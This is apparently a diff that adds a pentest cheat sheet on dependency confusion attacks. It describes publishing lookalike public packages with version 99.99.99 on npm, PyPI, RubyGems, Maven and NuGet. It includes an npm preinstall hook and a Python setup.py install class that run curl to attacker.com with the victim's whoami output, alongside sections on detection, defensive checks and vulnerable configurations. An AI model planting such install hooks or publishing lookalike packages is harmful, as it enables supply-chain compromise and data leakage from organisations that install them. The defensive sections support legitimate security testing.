@@ -1,0 +1,130 @@
+# Dependency Confusion Attack
+
+## ========================================
+## CONCEPT
+## ========================================
+
+# Attack vector: Upload public package with same name as internal private package
+# Package managers may install public version instead of private one
+
+## ========================================
+## NPM (Node.js)
+## ========================================
+
+# 1. Find internal package names
+# Check package.json for private packages
+# Look for @company-scope/package-name
+
+# 2. Create malicious package
+npm init
+# Set name to match internal package
+# Add malicious code in install scripts
+
+# 3. Publish to npmjs.com
+npm publish
+
+# package.json example
+{
+  "name": "internal-package-name",
+  "version": "99.99.99",
+  "scripts": {
+    "preinstall": "curl http://attacker.com/log?$(whoami)"
+  }
+}
+
+## ========================================
+## PYPI (Python)
+## ========================================
+
+# setup.py with malicious code
+from setuptools import setup
+from setuptools.command.install import install
+import os
+
+class PostInstall(install):
+    def run(self):
+        os.system('curl http://attacker.com/?$(whoami)')
+        install.run(self)
+
+setup(
+    name='internal-package-name',
+    version='99.99.99',
+    cmdclass={'install': PostInstall}
+)
+
+# Upload to PyPI
+python setup.py sdist
+twine upload dist/*
+
+## ========================================
+## RUBYGEMS (Ruby)
+## ========================================
+
+# Create gem matching internal name
+gem build internal-package.gemspec
+gem push internal-package-99.99.99.gem
+
+## ========================================
+## MAVEN (Java)
+## ========================================
+
+# Upload to Maven Central
+# Match internal package coordinates
+com.company:internal-package:99.99.99
+
+## ========================================
+## NUGET (.NET)
+## ========================================
+
+# Create NuGet package
+nuget pack internal-package.nuspec
+nuget push internal-package.99.99.99.nupkg
+
+## ========================================
+## TESTING FOR VULNERABILITY
+## ========================================
+
+# 1. Enumerate internal packages
+- Review source code
+- Check dependency files
+- Look for company-specific names
+
+# 2. Check if packages are public
+npm view internal-package-name
+pip search internal-package-name
+
+# 3. Test installation priority
+- Set up test environment
+- Add both public and private registry
+- Install package and see which is used
+
+## ========================================
+## DEFENSIVE TESTING
+## ========================================
+
+# Check if organization has:
+- Scoped packages (@company/)
+- Private registry configuration
+- Package version pinning
+- Registry priority settings
+
+## ========================================
+## INDICATORS
+## ========================================
+
+# Vulnerable configurations:
+- No package scoping
+- Public and private registries mixed
+- No registry priority
+- Wildcard version ranges
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Dependency confusion scanner
+dependency-confusion-scanner
+
+# Manual testing
+npm install --dry-run package-name
+pip install --dry-run package-name
